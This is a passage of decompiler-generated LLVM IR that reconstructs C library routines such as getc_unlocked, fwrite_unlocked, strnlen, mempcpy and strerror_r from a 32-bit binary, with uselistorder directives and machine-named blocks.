  uselistorder i32 %v6_804ea7f, { 1, 0 }
  uselistorder i32 %v1_804ea61, { 1, 0 }
  uselistorder i32 %v0_804ea7f.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804ea44, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804ea3b, { 1, 2, 0 }
  uselistorder i32 %v0_804ea01, { 1, 0 }
  uselistorder i32 %v1_804e9f3, { 1, 0 }
  uselistorder i32 %v1_804e9ee, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804e9ec, { 2, 0, 1 }
  uselistorder i32 %v0_804ea0e, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804e9a9, { 1, 2, 0 }
  uselistorder i32 %v0_804e981, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_804e977, { 1, 2, 0 }
  uselistorder i32 %v6_804e975, { 0, 2, 1 }
  uselistorder i32 %v0_804e974, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_804e96d, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_804e96d, { 2, 1, 0 }
  uselistorder i32 %v1_804e965, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_804e94b, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804e921, { 0, 2, 1 }
  uselistorder i32 %v0_804e90e, { 2, 0, 1 }
  uselistorder i32 %v4_804e8a8, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 5, 4, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 224, { 1, 0, 2 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -9, { 1, 0 }
  uselistorder i32 -5, { 3, 0, 1, 2 }
  uselistorder i32 -134548467, { 1, 0 }
  uselistorder i32 17, { 0, 2, 4, 3, 1 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_8050bfd.121 to i32), { 1, 0, 2 }
  uselistorder i32 -2147483648, { 4, 8, 0, 1, 2, 5, 6, 7, 3 }
  uselistorder i32 68, { 2, 3, 0, 4, 1 }
  uselistorder i32 5, { 1, 2, 9, 7, 10, 11, 8, 13, 14, 15, 0, 6, 3, 4, 12, 5, 16, 17 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32 -48, { 1, 2, 3, 4, 0 }
  uselistorder i32* @global_var_8052038, { 5, 0, 6, 2, 7, 1, 3, 8, 4 }
  uselistorder i32 80, { 5, 6, 7, 8, 9, 10, 1, 0, 2, 3, 4 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804ec6c, { 1, 0 }
  uselistorder label %dec_label_pc_804ec69, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804ec5d, { 1, 0 }
  uselistorder label %dec_label_pc_804ec32, { 1, 0 }
  uselistorder label %dec_label_pc_804ebf7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804eb9b, { 1, 0 }
  uselistorder label %dec_label_pc_804eb6f, { 1, 0 }
  uselistorder label %dec_label_pc_804ead7, { 1, 0 }
  uselistorder label %dec_label_pc_804eaa3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ea7a, { 1, 0 }
  uselistorder label %dec_label_pc_804ea51, { 1, 0 }
  uselistorder label %dec_label_pc_804ea18, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804e9bb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e975, { 1, 0 }
  uselistorder label %dec_label_pc_804e974, { 1, 0 }
  uselistorder label %dec_label_pc_804e95b, { 1, 0 }
  uselistorder label %dec_label_pc_804e944, { 1, 0 }
  uselistorder label %dec_label_pc_804e944.outer, { 2, 0, 1 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_2()
  %stack_var_-5 = alloca i8, align 1
  %v0_804ec74 = load i32, i32* @ebx, align 4
  %v4_804ec78 = ptrtoint i16* %tmp to i32
  store i32 %v4_804ec78, i32* @ebx, align 4
  %v1_804ec7c = add i32 %v4_804ec78, 16
  %v2_804ec7c = inttoptr i32 %v1_804ec7c to i32*
  %v3_804ec7c = load i32, i32* %v2_804ec7c, align 4
  %v2_804ec7f = add i32 %v4_804ec78, 24
  %v3_804ec7f = inttoptr i32 %v2_804ec7f to i32*
  %v4_804ec7f = load i32, i32* %v3_804ec7f, align 4
  %v10_804ec7f = icmp ult i32 %v3_804ec7c, %v4_804ec7f
  br i1 %v10_804ec7f, label %dec_label_pc_804ed21, label %dec_label_pc_804ec88

dec_label_pc_804ec88:                             ; preds = %entry
  %v2_804ec88 = load i16, i16* %tmp, align 2
  %v3_804ec88 = zext i16 %v2_804ec88 to i32
  %v1_804ec8b = and i32 %v3_804ec88, 131
  %v6_804ec95 = icmp ugt i32 %v1_804ec8b, 128
  br i1 %v6_804ec95, label %dec_label_pc_804ecaf, label %dec_label_pc_804ec97

dec_label_pc_804ec97:                             ; preds = %dec_label_pc_804ec88
  %v0_804ec97 = load i32, i32* @edx, align 4
  %v6_804ec9f = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_804ec97, i32 %v0_804ec97)
  %v1_804eca7 = icmp eq i32 %v6_804ec9f, 0
  %v1_804eca9 = icmp eq i1 %v1_804eca7, false
  br i1 %v1_804eca9, label %dec_label_pc_804ed46, label %dec_label_pc_804ec97.dec_label_pc_804ecaf_crit_edge

dec_label_pc_804ec97.dec_label_pc_804ecaf_crit_edge: ; preds = %dec_label_pc_804ec97
  %v0_804ecaf.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ecaf

dec_label_pc_804ecaf:                             ; preds = %dec_label_pc_804ec97.dec_label_pc_804ecaf_crit_edge, %dec_label_pc_804ec88
  %v2_804ece3 = phi i32 [ %v0_804ecaf.pre, %dec_label_pc_804ec97.dec_label_pc_804ecaf_crit_edge ], [ %v4_804ec78, %dec_label_pc_804ec88 ]
  %v1_804ecaf = inttoptr i32 %v2_804ece3 to i16*
  %v2_804ecaf = load i16, i16* %v1_804ecaf, align 2
  %v3_804ecaf = zext i16 %v2_804ecaf to i32
  store i32 %v3_804ecaf, i32* @ecx, align 4
  %v2_804ecb2 = and i16 %v2_804ecaf, 2
  %v3_804ecb2 = icmp eq i16 %v2_804ecb2, 0
  br i1 %v3_804ecb2, label %dec_label_pc_804ecd2, label %dec_label_pc_804ecb7

dec_label_pc_804ecb7:                             ; preds = %dec_label_pc_804ecaf
  %tmp20 = urem i16 %v2_804ecaf, 2
  %v1_804ecb9 = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_804ecb9
  %v2_804ecbc = and i32 %tmp19, 4
  %v3_804ecbc = add i32 %v2_804ece3, 36
  %v4_804ecbc = add i32 %v3_804ecbc, %v2_804ecbc
  %v5_804ecbc = inttoptr i32 %v4_804ecbc to i8*
  %v6_804ecbc = load i8, i8* %v5_804ecbc, align 1
  %v7_804ecbc = zext i8 %v6_804ecbc to i32
  %v8_804ecbc = load i32, i32* @edx, align 4
  %v9_804ecbc = and i32 %v8_804ecbc, -256
  %v10_804ecbc = or i32 %v9_804ecbc, %v7_804ecbc
  store i32 %v10_804ecbc, i32* %edx.global-to-local, align 4
  %v1_804ecc0 = add i16 %v2_804ecaf, -1
  store i16 %v1_804ecc0, i16* %v1_804ecaf, align 2
  %v0_804ecc6 = load i32, i32* @ebx, align 4
  %v1_804ecc6 = add i32 %v0_804ecc6, 40
  %v2_804ecc6 = inttoptr i32 %v1_804ecc6 to i32*
  store i32 0, i32* %v2_804ecc6, align 4
  %v0_804eccd = load i32, i32* %edx.global-to-local, align 4
  %v1_804eccd = urem i32 %v0_804eccd, 256
  store i32 %v1_804eccd, i32* @edx, align 4
  br label %dec_label_pc_804ed49

dec_label_pc_804ecd2:                             ; preds = %dec_label_pc_804ecaf
  %v1_804ecd2 = add i32 %v2_804ece3, 16
  %v2_804ecd2 = inttoptr i32 %v1_804ecd2 to i32*
  %v3_804ecd2 = load i32, i32* %v2_804ecd2, align 4
  store i32 %v3_804ecd2, i32* @eax, align 4
  %v1_804ecd5 = add i32 %v2_804ece3, 20
  %v2_804ecd5 = inttoptr i32 %v1_804ecd5 to i32*
  %v3_804ecd5 = load i32, i32* %v2_804ecd5, align 4
  %v15_804ecd5 = icmp eq i32 %v3_804ecd5, %v3_804ecd2
  %v1_804ecd8 = icmp eq i1 %v15_804ecd5, false
  br i1 %v1_804ecd8, label %dec_label_pc_804ed21, label %dec_label_pc_804ecda

dec_label_pc_804ecda:                             ; preds = %dec_label_pc_804ecd2
  %v1_804ecda = add i32 %v2_804ece3, 4
  %v2_804ecda = inttoptr i32 %v1_804ecda to i32*
  %v3_804ecda = load i32, i32* %v2_804ecda, align 4
  %v13_804ecda = icmp eq i32 %v3_804ecda, -2
  %v1_804ecde = icmp eq i1 %v13_804ecda, false
  br i1 %v1_804ecde, label %dec_label_pc_804ece8, label %dec_label_pc_804ece0

dec_label_pc_804ece0:                             ; preds = %dec_label_pc_804ecda
  %v1_804ece0 = or i32 %v3_804ecaf, 4
  store i32 %v1_804ece0, i32* @ecx, align 4
  %v1_804ece3 = trunc i32 %v1_804ece0 to i16
  store i16 %v1_804ece3, i16* %v1_804ecaf, align 2
  br label %dec_label_pc_804ed46

dec_label_pc_804ece8:                             ; preds = %dec_label_pc_804ecda
  %v3_804ece8 = and i16 %v2_804ecaf, 768
  %v4_804ece8 = icmp eq i16 %v3_804ece8, 0
  br i1 %v4_804ece8, label %dec_label_pc_804ecfd, label %dec_label_pc_804eced

dec_label_pc_804eced:                             ; preds = %dec_label_pc_804ece8
  %v3_804ecf5 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_805218c.104 to i16*))
  %v0_804ecfd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ecfd

dec_label_pc_804ecfd:                             ; preds = %dec_label_pc_804ece8, %dec_label_pc_804eced
  %v0_804ed32 = phi i32 [ %v2_804ece3, %dec_label_pc_804ece8 ], [ %v0_804ecfd.pre, %dec_label_pc_804eced ]
  %v1_804ecfd = add i32 %v0_804ed32, 8
  %v2_804ecfd = inttoptr i32 %v1_804ecfd to i32*
  %v3_804ecfd = load i32, i32* %v2_804ecfd, align 4
  %v1_804ed00 = add i32 %v0_804ed32, 12
  %v2_804ed00 = inttoptr i32 %v1_804ed00 to i32*
  %v3_804ed00 = load i32, i32* %v2_804ed00, align 4
  %v15_804ed00 = icmp eq i32 %v3_804ed00, %v3_804ecfd
  br i1 %v15_804ed00, label %dec_label_pc_804ed2a, label %dec_label_pc_804ed05

dec_label_pc_804ed05:                             ; preds = %dec_label_pc_804ecfd
  %v2_804ed08 = add i32 %v0_804ed32, 24
  %v3_804ed08 = inttoptr i32 %v2_804ed08 to i32*
  store i32 %v3_804ecfd, i32* %v3_804ed08, align 4
  %v0_804ed0b = load i32, i32* @ebx, align 4
  %v2_804ed0c = call i32 @__stdio_rfill(i32 %v0_804ed0b)
  %v1_804ed14 = icmp eq i32 %v2_804ed0c, 0
  br i1 %v1_804ed14, label %dec_label_pc_804ed46, label %dec_label_pc_804ed18

dec_label_pc_804ed18:                             ; preds = %dec_label_pc_804ed05
  %v0_804ed18 = load i32, i32* @ebx, align 4
  %v1_804ed18 = add i32 %v0_804ed18, 20
  %v2_804ed18 = inttoptr i32 %v1_804ed18 to i32*
  %v3_804ed18 = load i32, i32* %v2_804ed18, align 4
  %v2_804ed1b = add i32 %v0_804ed18, 24
  %v3_804ed1b = inttoptr i32 %v2_804ed1b to i32*
  store i32 %v3_804ed18, i32* %v3_804ed1b, align 4
  %v0_804ed1e = load i32, i32* @ebx, align 4
  %v1_804ed1e = add i32 %v0_804ed1e, 16
  %v2_804ed1e = inttoptr i32 %v1_804ed1e to i32*
  %v3_804ed1e = load i32, i32* %v2_804ed1e, align 4
  br label %dec_label_pc_804ed21

dec_label_pc_804ed21:                             ; preds = %dec_label_pc_804ecd2, %entry, %dec_label_pc_804ed18
  %v1_804ed25 = phi i32 [ %v2_804ece3, %dec_label_pc_804ecd2 ], [ %v4_804ec78, %entry ], [ %v0_804ed1e, %dec_label_pc_804ed18 ]
  %v0_804ed21 = phi i32 [ %v3_804ecd2, %dec_label_pc_804ecd2 ], [ %v3_804ec7c, %entry ], [ %v3_804ed1e, %dec_label_pc_804ed18 ]
  %v1_804ed21 = inttoptr i32 %v0_804ed21 to i8*
  %v2_804ed21 = load i8, i8* %v1_804ed21, align 1
  %v3_804ed21 = zext i8 %v2_804ed21 to i32
  store i32 %v3_804ed21, i32* @edx, align 4
  %v1_804ed24 = add i32 %v0_804ed21, 1
  %v2_804ed25 = add i32 %v1_804ed25, 16
  %v3_804ed25 = inttoptr i32 %v2_804ed25 to i32*
  store i32 %v1_804ed24, i32* %v3_804ed25, align 4
  %v0_804ed4c.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ed49

dec_label_pc_804ed2a:                             ; preds = %dec_label_pc_804ecfd
  %v2_804ed2d = ptrtoint i8* %stack_var_-5 to i32
  %v5_804ed32 = inttoptr i32 %v0_804ed32 to i16*
  %v5_804ed33 = call i32 @__stdio_READ(i16* %v5_804ed32, i32 %v2_804ed2d, i32 1)
  %v1_804ed3b = icmp eq i32 %v5_804ed33, 0
  br i1 %v1_804ed3b, label %dec_label_pc_804ed46, label %dec_label_pc_804ed3f

dec_label_pc_804ed3f:                             ; preds = %dec_label_pc_804ed2a
  %v3_804ed3f = load i8, i8* %stack_var_-5, align 1
  %v4_804ed3f = sext i8 %v3_804ed3f to i32
  store i32 %v4_804ed3f, i32* @edx, align 4
  br label %dec_label_pc_804ed49

dec_label_pc_804ed46:                             ; preds = %dec_label_pc_804ed2a, %dec_label_pc_804ed05, %dec_label_pc_804ec97, %dec_label_pc_804ece0
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_804ed49

dec_label_pc_804ed49:                             ; preds = %dec_label_pc_804ed3f, %dec_label_pc_804ed21, %dec_label_pc_804ecb7, %dec_label_pc_804ed46
  %v0_804ed4c = phi i32 [ %v4_804ed3f, %dec_label_pc_804ed3f ], [ %v0_804ed4c.pre, %dec_label_pc_804ed21 ], [ %v1_804eccd, %dec_label_pc_804ecb7 ], [ -1, %dec_label_pc_804ed46 ]
  store i32 %v0_804ec74, i32* @ebx, align 4
  ret i32 %v0_804ed4c

; uselistorder directives
  uselistorder i32 %v0_804ed21, { 1, 0 }
  uselistorder i32 %v3_804ecfd, { 1, 0 }
  uselistorder i32 %v0_804ed32, { 0, 1, 3, 2 }
  uselistorder i32 %v3_804ecd2, { 1, 0, 2 }
  uselistorder i32 %v1_804eccd, { 1, 0 }
  uselistorder i16 %v2_804ecaf, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_804ece3, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i16* @global_var_80521e0.103, { 2, 1, 0 }
  uselistorder i32 36, { 8, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18, 1, 2, 19, 3 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_804ed49, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ed46, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804ed21, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ecfd, { 1, 0 }
}

define i32 @__GI_fputs_unlocked() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i8* @__decompiler_undefined_function_4()
  %stack_var_-8 = alloca i32, align 4
  %v0_804ed50 = load i32, i32* @esi, align 4
  %v0_804ed51 = load i32, i32* @ebx, align 4
  store i32 %v0_804ed51, i32* %stack_var_-8, align 4
  %v4_804ed55 = ptrtoint i8* %tmp3 to i32
  store i32 %v4_804ed55, i32* @ebx, align 4
  %v3_804ed5a = call i32 @strlen(i8* %tmp3)
  store i32 %v3_804ed5a, i32* @esi, align 4
  %v0_804ed6b = load i32, i32* @ebx, align 4
  %v6_804ed6c = call i32 @__GI_fwrite_unlocked(i32 %v0_804ed6b, i64 1, i32 %v3_804ed5a, i32 %tmp)
  %v1_804ed76 = load i32, i32* @esi, align 4
  %v12_804ed76 = icmp eq i32 %v6_804ed6c, %v1_804ed76
  %v3_804ed78 = select i1 %v12_804ed76, i32 %v6_804ed6c, i32 -1
  %v2_804ed7e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ed7e, i32* @ebx, align 4
  store i32 %v0_804ed50, i32* @esi, align 4
  ret i32 %v3_804ed78

; uselistorder directives
  uselistorder i32 %v6_804ed6c, { 1, 0 }
  uselistorder i8* %tmp3, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804ed84 = load i32, i32* @edi, align 4
  %v0_804ed85 = load i32, i32* @esi, align 4
  %v0_804ed86 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804ed8b = trunc i64 %arg2 to i32
  store i32 %v4_804ed8b, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804ed93 = inttoptr i32 %arg4 to i16*
  %v2_804ed93 = load i16, i16* %v1_804ed93, align 2
  %v1_804ed96 = and i16 %v2_804ed93, 192
  %v6_804ed9b = icmp eq i16 %v1_804ed96, 192
  br i1 %v6_804ed9b, label %dec_label_pc_804edb6, label %dec_label_pc_804eda2

dec_label_pc_804eda2:                             ; preds = %entry
  %v0_804eda2 = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v9_804edaa = call i32 @__stdio_trans2w_o(i16* %v1_804ed93, i32 128, i32 %v0_804eda2, i32 %v0_804eda2, i32 %v0_804ed86, i32 %v0_804ed85, i32 %v0_804ed84)
  %v1_804edb2 = icmp eq i32 %v9_804edaa, 0
  %v1_804edb4 = icmp eq i1 %v1_804edb2, false
  br i1 %v1_804edb4, label %dec_label_pc_804edf6, label %dec_label_pc_804edb6

dec_label_pc_804edb6:                             ; preds = %dec_label_pc_804eda2, %entry
  %v2_804edb6 = icmp eq i32 %v4_804ed8b, 0
  br i1 %v2_804edb6, label %dec_label_pc_804edf6, label %dec_label_pc_804edba

dec_label_pc_804edba:                             ; preds = %dec_label_pc_804edb6
  %v1_804edba = icmp eq i32 %arg3, 0
  br i1 %v1_804edba, label %dec_label_pc_804edf6, label %dec_label_pc_804edbe

dec_label_pc_804edbe:                             ; preds = %dec_label_pc_804edba
  %v9_804edc3 = udiv i64 4294967295, %arg2
  %v10_804edc3 = trunc i64 %v9_804edc3 to i32
  %v6_804edc7 = icmp ult i32 %v10_804edc3, %arg3
  br i1 %v6_804edc7, label %dec_label_pc_804ede3, label %dec_label_pc_804edc9

dec_label_pc_804edc9:                             ; preds = %dec_label_pc_804edbe
  %sext = mul i64 %arg2, 4294967296
  %v2_804edcc = sdiv i64 %sext, 4294967296
  %v3_804edcc = sext i32 %arg3 to i64
  %v4_804edcc = mul nsw i64 %v3_804edcc, %v2_804edcc
  %v5_804edcc = trunc i64 %v4_804edcc to i32
  %v0_804edcf = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804edd5 = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_804edcc, i32 %v0_804edcf, i32 %v10_804edc3)
  %v6_804edd5 = sext i32 %v5_804edd5 to i64
  %v10_804eddf = udiv i64 %v6_804edd5, %arg2
  %v11_804eddf = trunc i64 %v10_804eddf to i32
  br label %dec_label_pc_804edf8

dec_label_pc_804ede3:                             ; preds = %dec_label_pc_804edbe
  %v0_804ede3 = load i32, i32* @ebx, align 4
  %v1_804ede3 = inttoptr i32 %v0_804ede3 to i32*
  %v2_804ede3 = load i32, i32* %v1_804ede3, align 4
  %v1_804ede5 = or i32 %v2_804ede3, 8
  %v1_804ede8 = trunc i32 %v1_804ede5 to i16
  %v3_804ede8 = inttoptr i32 %v0_804ede3 to i16*
  store i16 %v1_804ede8, i16* %v3_804ede8, align 2
  %v0_804edeb = load i32, i32* %stack_var_-28, align 4
  %v1_804edeb = call i32 @__errno_location(i32 %v0_804edeb)
  %v1_804edf0 = inttoptr i32 %v1_804edeb to i32*
  store i32 22, i32* %v1_804edf0, align 4
  br label %dec_label_pc_804edf6

dec_label_pc_804edf6:                             ; preds = %dec_label_pc_804edba, %dec_label_pc_804edb6, %dec_label_pc_804eda2, %dec_label_pc_804ede3
  br label %dec_label_pc_804edf8

dec_label_pc_804edf8:                             ; preds = %dec_label_pc_804edc9, %dec_label_pc_804edf6
  %v0_804edfb = phi i32 [ %v11_804eddf, %dec_label_pc_804edc9 ], [ 0, %dec_label_pc_804edf6 ]
  store i32 %v0_804ed85, i32* @esi, align 4
  store i32 %v0_804ed84, i32* @edi, align 4
  ret i32 %v0_804edfb

; uselistorder directives
  uselistorder i32 %v0_804eda2, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 128, { 3, 4, 8, 11, 12, 13, 14, 15, 2, 1, 17, 7, 9, 5, 6, 10, 0, 16 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804edf8, { 1, 0 }
  uselistorder label %dec_label_pc_804edf6, { 3, 0, 1, 2 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_4()
  %v4_804edfc = ptrtoint i8* %tmp4 to i32
  %v8_804ee0f5 = icmp eq i32 %tmp, 0
  %v1_804ee107 = icmp eq i1 %v8_804ee0f5, false
  br i1 %v1_804ee107, label %dec_label_pc_804ee09, label %dec_label_pc_804ee12

dec_label_pc_804ee09:                             ; preds = %entry, %dec_label_pc_804ee0e
  %v1_804ee0f9 = phi i32 [ %v1_804ee0f, %dec_label_pc_804ee0e ], [ %tmp, %entry ]
  %v0_804ee128 = phi i32 [ %v1_804ee0e, %dec_label_pc_804ee0e ], [ %v4_804edfc, %entry ]
  %v1_804ee09 = inttoptr i32 %v0_804ee128 to i8*
  %v2_804ee09 = load i8, i8* %v1_804ee09, align 1
  %v3_804ee09 = icmp eq i8 %v2_804ee09, 0
  br i1 %v3_804ee09, label %dec_label_pc_804ee12, label %dec_label_pc_804ee0e

dec_label_pc_804ee0e:                             ; preds = %dec_label_pc_804ee09
  %v1_804ee0e = add i32 %v0_804ee128, 1
  %v1_804ee0f = add i32 %v1_804ee0f9, -1
  %v8_804ee0f = icmp eq i32 %v1_804ee0f, 0
  %v1_804ee10 = icmp eq i1 %v8_804ee0f, false
  br i1 %v1_804ee10, label %dec_label_pc_804ee09, label %dec_label_pc_804ee12

dec_label_pc_804ee12:                             ; preds = %dec_label_pc_804ee0e, %dec_label_pc_804ee09, %entry
  %v0_804ee12.lcssa = phi i32 [ %v4_804edfc, %entry ], [ %v0_804ee128, %dec_label_pc_804ee09 ], [ %v1_804ee0e, %dec_label_pc_804ee0e ]
  %v2_804ee12 = sub i32 %v0_804ee12.lcssa, %v4_804edfc
  ret i32 %v2_804ee12

; uselistorder directives
  uselistorder i32 %v1_804ee0f, { 1, 0 }
  uselistorder i32 %v0_804ee128, { 0, 2, 1 }
  uselistorder i32 %v4_804edfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ee09, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804ee18 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_804ee2b = inttoptr i32 %arg1 to i16*
  %v4_804ee2b = call i32 @memcpy(i16* %v3_804ee2b, i32 %arg2, i32 %arg3)
  %v0_804ee33 = load i32, i32* @esi, align 4
  %v2_804ee33 = add i32 %v0_804ee33, %arg3
  store i32 %v0_804ee18, i32* @esi, align 4
  ret i32 %v2_804ee33
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804ee4d = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804ee55 = load i32, i32* @ebx, align 4
  ret i32 %v0_804ee55
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804ee6e = icmp ugt i32 %arg1, 124
  br i1 %v6_804ee6e, label %dec_label_pc_804ee8b, label %dec_label_pc_804ee70

dec_label_pc_804ee70:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_8050c60.124 to i32), i32* @esi, align 4
  %v1_804ee804 = icmp eq i32 %arg1, 0
  %v1_804ee8211 = icmp eq i1 %v1_804ee804, false
  br i1 %v1_804ee8211, label %dec_label_pc_804ee79, label %dec_label_pc_804ee84

dec_label_pc_804ee79:                             ; preds = %dec_label_pc_804ee70, %dec_label_pc_804ee79
  %v0_804ee7c = phi i32 [ %v3_804ee7c, %dec_label_pc_804ee79 ], [ %arg1, %dec_label_pc_804ee70 ]
  %v0_804ee7f = phi i32 [ %v1_804ee7f, %dec_label_pc_804ee79 ], [ ptrtoint ([8 x i8]* @global_var_8050c60.124 to i32), %dec_label_pc_804ee70 ]
  %v1_804ee79 = inttoptr i32 %v0_804ee7f to i8*
  %v2_804ee79 = load i8, i8* %v1_804ee79, align 1
  %v7_804ee79 = icmp eq i8 %v2_804ee79, 0
  %v2_804ee7c = zext i1 %v7_804ee79 to i32
  %v3_804ee7c = add i32 %v2_804ee7c, %v0_804ee7c
  %v16_804ee7c = icmp eq i32 %v3_804ee7c, 0
  %v1_804ee7f = add i32 %v0_804ee7f, 1
  store i32 %v1_804ee7f, i32* @esi, align 4
  %v1_804ee82 = icmp eq i1 %v16_804ee7c, false
  br i1 %v1_804ee82, label %dec_label_pc_804ee79, label %dec_label_pc_804ee84

dec_label_pc_804ee84:                             ; preds = %dec_label_pc_804ee79, %dec_label_pc_804ee70
  %v0_804ee86 = phi i32 [ ptrtoint ([8 x i8]* @global_var_8050c60.124 to i32), %dec_label_pc_804ee70 ], [ %v1_804ee7f, %dec_label_pc_804ee79 ]
  store i32 0, i32* @ebp, align 4
  %v1_804ee86 = inttoptr i32 %v0_804ee86 to i8*
  %v2_804ee86 = load i8, i8* %v1_804ee86, align 1
  %v3_804ee86 = icmp eq i8 %v2_804ee86, 0
  %v1_804ee89 = icmp eq i1 %v3_804ee86, false
  br i1 %v1_804ee89, label %dec_label_pc_804ee84.dec_label_pc_804eeba_crit_edge, label %dec_label_pc_804ee8b

dec_label_pc_804ee84.dec_label_pc_804eeba_crit_edge: ; preds = %dec_label_pc_804ee84
  br label %dec_label_pc_804eeba

dec_label_pc_804ee8b:                             ; preds = %dec_label_pc_804ee84, %entry
  %v1_804ee8e = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_804ee9f = bitcast i32* %stack_var_-17 to i8*
  %v7_804ee9f = call i32 @_uintmaxtostr(i8* %v6_804ee9f, i32 %arg1, i32 %v1_804ee8e, i32 -10, i32 0)
  %v1_804eeae = add i32 %v7_804ee9f, -14
  store i32 %v1_804eeae, i32* @esi, align 4
  %v5_804eeb1 = inttoptr i32 %v1_804eeae to i8*
  store i8* %v5_804eeb1, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804eeae to i16*
  %v6_804eeb2 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8050c3e.125 to i32), i32 14)
  %v1_804eec4.pre = load i32, i32* @edi, align 4
  %v0_804eeca.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804eeba

dec_label_pc_804eeba:                             ; preds = %dec_label_pc_804ee84.dec_label_pc_804eeba_crit_edge, %dec_label_pc_804ee8b
